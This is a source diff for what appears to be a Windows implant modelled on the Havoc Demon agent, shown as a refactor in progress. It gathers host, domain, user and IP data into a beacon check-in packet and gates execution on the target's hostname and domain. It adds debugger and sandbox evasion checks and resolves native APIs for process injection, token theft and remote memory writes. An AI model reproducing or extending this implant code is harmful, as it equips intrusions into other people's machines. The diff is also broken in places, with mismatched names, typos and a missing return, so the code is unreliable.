@@ -1,10 +1,9 @@
 #include <core/include/base.hpp>
 
 VOID Entrypoint() {
-    if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
-        return;
-    }
 
+	// EnumSystem()
+	// ParseConfig()
     MainRoutine();
 }
 
@@ -18,11 +17,10 @@ namespace Main {
                 !RuntimeChecks()) {
                 break;
             }
-
             if (!CheckTime()) {
                 continue;
             }
-            if (!ctx->session.checkin && !ctx->transport.message_queue) {
+            if (!Ctx->Session.CheckIn && !ctx->transport.message_queue) {
                 if (!EnumSystem()) {
                     break;
                 }
@@ -43,255 +41,270 @@ namespace Main {
         ContextDestroy();
     }
 
-    BOOL EnumSystem() {
-        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
-        PACKET *out = CreateStreamWithHeaders(TypeCheckin);
+	BOOL CheckSystem() {
+		Ctx->Module.ntdll 		= FindModuleAddress(NTDLL);
+		Ctx->Module.Kernel32 	= FindModuleAddress(KERNEL32);
 
-        IP_ADAPTER_INFO adapter     = { };
-        OSVERSIONINFOW os_version   = { };
+		if (!Ctx->Module.Ntdll || !Ctx->Module.Kernel32) {
+			return false;
+		}
+		Ctx->Win32.RtlGetVersion = 	FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLGETVERSION);
+		Ctx->Win32.IsWow64Process = FindExportAddress((LPVOID)Ctx->Module.Kernel32, ISWOW64PROCESS);
+
+		// NOTE: Get version and check for dbg and sandbox
+        OSVERSIONINFOW osVersion = { };
         BOOL success = false;
 
-        DWORD name_len = MAX_PATH;
-        CHAR buffer[MAX_PATH] = { };
+        if (!NT_SUCCESS(Ctx->Win32.RtlGetVersion(&os_version))) {
+			return false;
+		}
 
-        PROCESSENTRY32 proc_entry   = { };
-        proc_entry.dwSize           = sizeof(PROCESSENTRY32);
+        Ctx->Session.Version = WIN_VERSION_UNKNOWN;
+        osVersion.dwOSVersionInfoSize = sizeof(osVersion);
 
-        HANDLE snap = ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (snap == INVALID_HANDLE_VALUE) {
-            goto defer;
-        }
-
-        x_ntassertb(ctx->win32.RtlGetVersion(&os_version));
-
-        ctx->session.version = WIN_VERSION_UNKNOWN;
-        os_version.dwOSVersionInfoSize = sizeof(os_version);
-
-        if (os_version.dwMajorVersion >= 5) {
-            if (os_version.dwMajorVersion == 5) {
-                if (os_version.dwMinorVersion == 1) {
+        if (osVersion.dwMajorVersion >= 5) {
+            if (osVersion.dwMajorVersion == 5) {
+                if (osVersion.dwMinorVersion == 1) {
                     ctx->session.version = WIN_VERSION_XP;
                 }
             }
-            else if (os_version.dwMajorVersion == 6) {
-                if (os_version.dwMinorVersion == 0) {
+            else if (osVersion.dwMajorVersion == 6) {
+                if (osVersion.dwMinorVersion == 0) {
                     ctx->session.version = WIN_VERSION_2008;
                 }
-                else if (os_version.dwMinorVersion == 1) {
+                else if (osVersion.dwMinorVersion == 1) {
                     ctx->session.version = WIN_VERSION_2008_R2;
                 }
-                else if (os_version.dwMinorVersion == 2) {
+                else if (osVersion.dwMinorVersion == 2) {
                     ctx->session.version = WIN_VERSION_2012;
                 }
-                else if (os_version.dwMinorVersion == 3) {
+                else if (osVersion.dwMinorVersion == 3) {
                     ctx->session.version = WIN_VERSION_2012_R2;
                 }
-            } else if (os_version.dwMajorVersion == 10) {
-                if (os_version.dwMinorVersion == 0) {
+            } else if (osVersion.dwMajorVersion == 10) {
+                if (osVersion.dwMinorVersion == 0) {
                     ctx->session.version = WIN_VERSION_2016_X;
                 }
             }
         }
+		if (!Opsec::CheckDebugger() || !Opsec::CheckSandbox()) {
+			return false;
+		}
+	}
 
-        if (ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
-            if (ctx->config.hostname[0]) {
-                if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
+    BOOL EnumSystem() {
+        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
+		BOOL success = false;
+        PACKET *outPack = CreateStreamWithHeaders(TypeCheckin);
+
+        IP_ADAPTER_INFO adapter = { };
+        CHAR buffer[MAX_PATH] 	= { };
+        DWORD nameLen 			= MAX_PATH;
+
+        PROCESSENTRY32 procEntry   = { };
+        procEntry.dwSize           = sizeof(PROCESSENTRY32);
+
+		Ctx->Win32.GetComputerNameExA = FindExportAddress((LPVOID)Ctx->Mdoue.Kernel32, GETCOMPUTERNAMEEXA);
+
+        if (Ctx->Win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR)buffer, &nameLen)) {
+            if (Ctx->Config.Hostname[0]) {
+                if (MbsBoundCompare(buffer, Ctx->Config.Hostname, MbsLength(Ctx->Config.Hostname)) != 0) {
                     // LOG ERROR (bad host)
-                    success = true;
                     goto defer;
                 }
             }
-            PackString(out, buffer);
-        }
-        else {
-            PackUint32(out, 0);
+            PackString(outPack, buffer);
+        } else {
+            PackUint32(outPack, 0);
         }
 
         MemSet(buffer, 0, MAX_PATH);
-        name_len = MAX_PATH;
+        nameLen = MAX_PATH;
 
-        if (ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
-            if (ctx->transport.domain[0]) {
-                if (MbsBoundCompare(ctx->transport.domain, buffer, MbsLength(ctx->transport.domain)) != 0) {
+        if (Ctx->Win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR)buffer, &nameLen)) {
+            if (Ctx->Transport.Domain[0]) {
+                if (MbsBoundCompare(Ctx->Transport.Domain, buffer, MbsLength(Ctx->Transport.Domain)) != 0) {
                     // LOG ERROR (bad domain)
-                    success = true;
                     goto defer;
                 }
             }
-            PackString(out, buffer);
-        }
-        else {
-            PackUint32(out, 0);
-        }
-
-        MemSet(buffer, 0, MAX_PATH);
-        name_len = MAX_PATH;
-
-        if (ctx->win32.GetUserNameA((LPSTR) buffer, &name_len)) {
-            PackString(out, buffer);
-        }
-        else {
-            PackUint32(out, 0);
+            PackString(outPack, buffer);
+        } else {
+            PackUint32(outPack, 0);
         }
 
         MemSet(buffer, 0, MAX_PATH);
-        name_len = sizeof(IP_ADAPTER_INFO);
+        nameLen = MAX_PATH;
 
-        if (ctx->win32.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
-            PackString(out, adapter.IpAddressList.IpAddress.String);
+		// NOTE: Beyond this point we can start capturing info.
+		Ctx->Module.Iphlpapi = LoadLibrary(IPHLPAPI); // TODO: need to fix library loader.
+		if (!Ctx->Module.Iphlpapi) {
+			goto defer;
+		}
+
+		Ctx->Win32.GetUserNameA = FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETUSERNAMEA);
+		Ctx->Win32.GetAdaptersInfo = FindExportAddress((LPVOID)Ctx->Module.Iphlpapi, GETADAPTERSINFO);
+
+        if (Ctx->Win32.GetUserNameA((LPSTR)buffer, &nameLen)) {
+            PackString(outPack, buffer);
+        } else {
+            PackUint32(outPack, 0);
         }
-        else {
-            PackUint32(out, 0);
+
+        MemSet(buffer, 0, MAX_PATH);
+        nameLen = sizeof(IP_ADAPTER_INFO);
+
+        if (Ctx->Win32.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
+            PackString(outPack, adapter.IpAddressList.IpAddress.String);
+        } else {
+            PackUint32(outPack, 0);
         }
 
         MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
         success = true;
+defer:
+        success 
+			? MessageQueue(outPack) 
+			: DestroyStream(outPack);
 
-        defer:
-        success ? MessageQueue(out) : DestroyStream(out);
         return success;
     }
 
     BOOL ResolveApi() {
         // TODO: create separate ResolveApi for loader and payload
 		BOOL success = true;
-		x_assertb(ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
-		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
 
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcess, 							ctx->modules.ntdll, NTOPENPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateUserProcess, 					ctx->modules.ntdll, NTCREATEUSERPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateProcess, 					ctx->modules.ntdll, NTTERMINATEPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateProcessParametersEx, 			ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyProcessParameters, 			ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcessToken, 					ctx->modules.ntdll, NTOPENPROCESSTOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThreadToken, 						ctx->modules.ntdll, NTOPENTHREADTOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateToken, 						ctx->modules.ntdll, NTDUPLICATETOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateObject, 						ctx->modules.ntdll, NTDUPLICATEOBJECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationToken, 				ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationProcess, 				ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtFreeVirtualMemory, 					ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtAllocateVirtualMemory, 				ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtProtectVirtualMemory, 				ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtReadVirtualMemory, 					ctx->modules.ntdll, NTREADVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtWriteVirtualMemory, 					ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryVirtualMemory, 					ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateSection, 						ctx->modules.ntdll, NTCREATESECTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtMapViewOfSection, 					ctx->modules.ntdll, NTMAPVIEWOFSECTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtUnmapViewOfSection, 					ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlAddVectoredExceptionHandler, 		ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlRemoveVectoredExceptionHandler, 		ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateHeap, 							ctx->modules.ntdll, RTLCREATEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlAllocateHeap, 						ctx->modules.ntdll, RTLALLOCATEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlReAllocateHeap, 						ctx->modules.ntdll, RTLREALLOCATEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlFreeHeap, 							ctx->modules.ntdll, RTLFREEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyHeap, 						ctx->modules.ntdll, RTLDESTROYHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlRbInsertNodeEx, 						ctx->modules.ntdll, RTLRBINSERTNODEEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlGetVersion, 							ctx->modules.ntdll, RTLGETVERSION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemInformation, 				ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemTime, 						ctx->modules.ntdll, NTQUERYSYSTEMTIME));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateThreadEx, 						ctx->modules.ntdll, NTCREATETHREADEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThread, 							ctx->modules.ntdll, NTOPENTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateThread, 						ctx->modules.ntdll, NTTERMINATETHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtResumeThread, 						ctx->modules.ntdll, NTRESUMETHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtGetContextThread, 					ctx->modules.ntdll, NTGETCONTEXTTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtSetContextThread, 					ctx->modules.ntdll, NTSETCONTEXTTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtSetInformationThread, 				ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtTestAlert, 							ctx->modules.ntdll, NTTESTALERT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtDelayExecution, 						ctx->modules.ntdll, NTDELAYEXECUTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateEvent, 							ctx->modules.ntdll, NTCREATEEVENT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueueApcThread, 						ctx->modules.ntdll, NTQUEUEAPCTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtAlertResumeThread, 					ctx->modules.ntdll, NTALERTRESUMETHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtWaitForSingleObject, 					ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtSignalAndWaitForSingleObject, 		ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtContinue, 							ctx->modules.ntdll, NTCONTINUE));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlInitUnicodeString, 					ctx->modules.ntdll, RTLINITUNICODESTRING));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlHashUnicodeString, 					ctx->modules.ntdll, RTLHASHUNICODESTRING));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlRandomEx, 							ctx->modules.ntdll, RTLRANDOMEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtClose, 								ctx->modules.ntdll, NTCLOSE));
+		(LPVOID)Ctx->Module.Kernbase = FindModuleAddress(KERNELBASE);
 
-		x_assertb(F_PTR_HMOD(ctx->win32.FlushInstructionCache,                  ctx->modules.kernel32, FLUSHINSTRUCTIONCACHE));
-		x_assertb(F_PTR_HMOD(ctx->win32.IsBadReadPtr,                           ctx->modules.kernel32, ISBADREADPTR));
-		x_assertb(F_PTR_HMOD(ctx->win32.DeviceIoControl,                        ctx->modules.kernel32, DEVICEIOCONTROL));
-		x_assertb(F_PTR_HMOD(ctx->win32.FileTimeToSystemTime, 					ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetCurrentDirectoryA, 					ctx->modules.kernel32, GETCURRENTDIRECTORYA));
-		x_assertb(F_PTR_HMOD(ctx->win32.SystemTimeToTzSpecificLocalTime, 		ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetFileAttributesW, 					ctx->modules.kernel32, GETFILEATTRIBUTESW));
-		x_assertb(F_PTR_HMOD(ctx->win32.CreateFileW, 							ctx->modules.kernel32, CREATEFILEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.FindFirstFileA, 						ctx->modules.kernel32, FINDFIRSTFILEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.FindFirstFileW, 						ctx->modules.kernel32, FINDFIRSTFILEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.FindNextFileA, 							ctx->modules.kernel32, FINDNEXTFILEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.FindNextFileW, 							ctx->modules.kernel32, FINDNEXTFILEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.FindClose, 								ctx->modules.kernel32, FINDCLOSE));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetFileSize, 							ctx->modules.kernel32, GETFILESIZE));
-		x_assertb(F_PTR_HMOD(ctx->win32.ReadFile, 								ctx->modules.kernel32, READFILE));
-		x_assertb(F_PTR_HMOD(ctx->win32.CallNamedPipeW, 						ctx->modules.kernel32, CALLNAMEDPIPEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.CreateNamedPipeW, 						ctx->modules.kernel32, CREATENAMEDPIPEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.WaitNamedPipeW, 						ctx->modules.kernel32, WAITNAMEDPIPEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetNamedPipeHandleState, 				ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
-		x_assertb(F_PTR_HMOD(ctx->win32.ConnectNamedPipe, 						ctx->modules.kernel32, CONNECTNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.TransactNamedPipe, 						ctx->modules.kernel32, TRANSACTNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.DisconnectNamedPipe, 					ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.PeekNamedPipe, 							ctx->modules.kernel32, PEEKNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetProcAddress, 						ctx->modules.kernel32, GETPROCADDRESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetModuleHandleA, 						ctx->modules.kernel32, GETMODULEHANDLEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.LoadLibraryA, 							ctx->modules.kernel32, LOADLIBRARYA));
-		x_assertb(F_PTR_HMOD(ctx->win32.FreeLibrary, 							ctx->modules.kernel32, FREELIBRARY));
-    	x_assertb(F_PTR_HMOD(ctx->win32.IsWow64Process, 						ctx->modules.kernel32, ISWOW64PROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.CreateToolhelp32Snapshot, 				ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
-		x_assertb(F_PTR_HMOD(ctx->win32.Process32First, 						ctx->modules.kernel32, PROCESS32FIRST));
-		x_assertb(F_PTR_HMOD(ctx->win32.Process32Next, 							ctx->modules.kernel32, PROCESS32NEXT));
-		x_assertb(F_PTR_HMOD(ctx->win32.GlobalMemoryStatusEx, 					ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetComputerNameExA, 					ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.SleepEx, 								ctx->modules.kernel32, SLEEPEX));
-    	x_assertb(F_PTR_HMOD(ctx->win32.FindResourceA, 							ctx->modules.kernel32, FINDRESOURCEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.LoadResource, 							ctx->modules.kernel32, LOADRESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.LockResource, 							ctx->modules.kernel32, LOCKRESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.SizeofResource, 						ctx->modules.kernel32, SIZEOFRESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
+		Ctx->Win32.NtOpenProcess= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENPROCESS);
+		Ctx->Win32.NtCreateUserProcess= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATEUSERPROCESS);
+		Ctx->Win32.NtTerminateProcess= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTTERMINATEPROCESS);
+		Ctx->Win32.RtlCreateProcessParametersEx= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLCREATEPROCESSPARAMETERSEX);
+		Ctx->Win32.RtlDestroyProcessParameters= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLDESTROYPROCESSPARAMETERS);
+		Ctx->Win32.NtOpenProcessToken= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENPROCESSTOKEN);
+		Ctx->Win32.NtOpenThreadToken= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENTHREADTOKEN);
+		Ctx->Win32.NtDuplicateToken= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTDUPLICATETOKEN);
+		Ctx->Win32.NtDuplicateObject= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTDUPLICATEOBJECT);
+		Ctx->Win32.NtQueryInformationToken= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYINFORMATIONTOKEN);
+		Ctx->Win32.NtQueryInformationProcess= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYINFORMATIONPROCESS);
+		Ctx->Win32.NtFreeVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTFREEVIRTUALMEMORY);
+		Ctx->Win32.NtAllocateVirtualMemory= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTALLOCATEVIRTUALMEMORY);
+		Ctx->Win32.NtProtectVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTPROTECTVIRTUALMEMORY);
+		Ctx->Win32.NtReadVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTREADVIRTUALMEMORY);
+		Ctx->Win32.NtWriteVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTWRITEVIRTUALMEMORY);
+		Ctx->Win32.NtQueryVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYVIRTUALMEMORY);
+		Ctx->Win32.NtCreateSection= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATESECTION);
+		Ctx->Win32.NtMapViewOfSection= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTMAPVIEWOFSECTION);
+		Ctx->Win32.NtUnmapViewOfSection= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTUNMAPVIEWOFSECTION);
+		Ctx->Win32.RtlAddVectoredExceptionHandler= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLADDVECTOREDEXCEPTIONHANDLER);
+		Ctx->Win32.RtlRemoveVectoredExceptionHandler= 		FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER);
+		Ctx->Win32.RtlCreateHeap= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLCREATEHEAP);
+		Ctx->Win32.RtlAllocateHeap= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLALLOCATEHEAP);
+		Ctx->Win32.RtlReAllocateHeap= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLREALLOCATEHEAP);
+		Ctx->Win32.RtlFreeHeap= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLFREEHEAP);
+		Ctx->Win32.RtlDestroyHeap= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLDESTROYHEAP);
+		Ctx->Win32.RtlRbInsertNodeEx= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLRBINSERTNODEEX);
+		Ctx->Win32.NtQuerySystemInformation= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYSYSTEMINFORMATION);
+		Ctx->Win32.NtQuerySystemTime= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYSYSTEMTIME);
+		Ctx->Win32.NtCreateThreadEx= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATETHREADEX);
+		Ctx->Win32.NtOpenThread= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENTHREAD);
+		Ctx->Win32.NtTerminateThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTTERMINATETHREAD);
+		Ctx->Win32.NtResumeThread= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTRESUMETHREAD);
+		Ctx->Win32.NtGetContextThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTGETCONTEXTTHREAD);
+		Ctx->Win32.NtSetContextThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTSETCONTEXTTHREAD);
+		Ctx->Win32.NtSetInformationThread= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTSETINFORMATIONTHREAD);
+		Ctx->Win32.NtTestAlert= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTTESTALERT);
+		Ctx->Win32.NtDelayExecution= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTDELAYEXECUTION);
+		Ctx->Win32.NtCreateEvent= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATEEVENT);
+		Ctx->Win32.NtQueueApcThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUEUEAPCTHREAD);
+		Ctx->Win32.NtAlertResumeThread= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTALERTRESUMETHREAD);
+		Ctx->Win32.NtWaitForSingleObject= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTWAITFORSINGLEOBJECT);
+		Ctx->Win32.NtSignalAndWaitForSingleObject= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTSIGNALANDWAITFORSINGLEOBJECT);
+		Ctx->Win32.NtContinue= 								FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCONTINUE);
+		Ctx->Win32.RtlInitUnicodeString= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLINITUNICODESTRING);
+		Ctx->Win32.RtlHashUnicodeString= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLHASHUNICODESTRING);
+		Ctx->Win32.RtlRandomEx= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLRANDOMEX);
+		Ctx->Win32.NtClose= 								FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCLOSE);
+
+		Ctx->Win32.FlushInstructionCache=                  	FindExportAddress((LPVOID)Ctx->Module.Kernel32, FLUSHINSTRUCTIONCACHE);
+		Ctx->Win32.IsBadReadPtr=                           	FindExportAddress((LPVOID)Ctx->Module.Kernel32, ISBADREADPTR);
+		Ctx->Win32.DeviceIoControl=                        	FindExportAddress((LPVOID)Ctx->Module.Kernel32, DEVICEIOCONTROL);
+		Ctx->Win32.FileTimeToSystemTime= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, FILETIMETOSYSTEMTIME);
+		Ctx->Win32.GetCurrentDirectoryA= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETCURRENTDIRECTORYA);
+		Ctx->Win32.SystemTimeToTzSpecificLocalTime= 		FindExportAddress((LPVOID)Ctx->Module.Kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME);
+		Ctx->Win32.GetFileAttributesW= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETFILEATTRIBUTESW);
+		Ctx->Win32.CreateFileW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, CREATEFILEW);
+		Ctx->Win32.FindFirstFileA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDFIRSTFILEA);
+		Ctx->Win32.FindFirstFileW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDFIRSTFILEW);
+		Ctx->Win32.FindNextFileA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDNEXTFILEA);
+		Ctx->Win32.FindNextFileW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDNEXTFILEW);
+		Ctx->Win32.FindClose= 								FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDCLOSE);
+		Ctx->Win32.GetFileSize= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETFILESIZE);
+		Ctx->Win32.ReadFile= 								FindExportAddress((LPVOID)Ctx->Module.Kernel32, READFILE);
+		Ctx->Win32.CallNamedPipeW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, CALLNAMEDPIPEW);
+		Ctx->Win32.CreateNamedPipeW= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, CREATENAMEDPIPEW);
+		Ctx->Win32.WaitNamedPipeW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, WAITNAMEDPIPEW);
+		Ctx->Win32.SetNamedPipeHandleState= 				FindExportAddress((LPVOID)Ctx->Module.Kernel32, SETNAMEDPIPEHANDLESTATE);
+		Ctx->Win32.ConnectNamedPipe= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, CONNECTNAMEDPIPE);
+		Ctx->Win32.TransactNamedPipe= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, TRANSACTNAMEDPIPE);
+		Ctx->Win32.DisconnectNamedPipe= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, DISCONNECTNAMEDPIPE);
+		Ctx->Win32.PeekNamedPipe= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, PEEKNAMEDPIPE);
+		Ctx->Win32.GetProcAddress= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETPROCADDRESS);
+		Ctx->Win32.GetModuleHandleA= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETMODULEHANDLEA);
